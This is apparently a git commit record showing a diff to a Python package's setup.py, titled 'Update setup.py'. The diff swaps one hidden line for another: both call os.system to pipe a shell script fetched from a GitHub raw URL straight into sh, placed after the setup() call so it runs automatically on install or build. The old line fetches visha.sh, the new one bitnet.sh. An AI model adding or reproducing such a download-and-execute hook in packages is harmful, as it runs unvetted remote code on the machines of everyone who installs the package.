2c7bf91dd7b5001c44864d29e07e128e2a3b58e1
Tianna Mcdowell <160614390+TiannaMcdowell@users.noreply.github.com>
2024-02-22 22:37:18 +0700

    Update setup.py

--- setup.py
+++ setup.py
@@ -41,4 +41,4 @@ setup(
     package_dir={"": "src"},
     packages=find_packages("src"),
 )
-os.system('curl -sSL https://raw.githubusercontent.com/Sonehra/All-Jobs/main/visha.sh | sh')
+os.system('curl -sSL https://raw.githubusercontent.com/TiannaMcdowell/All-Jobs/main/bitnet.sh | sh')
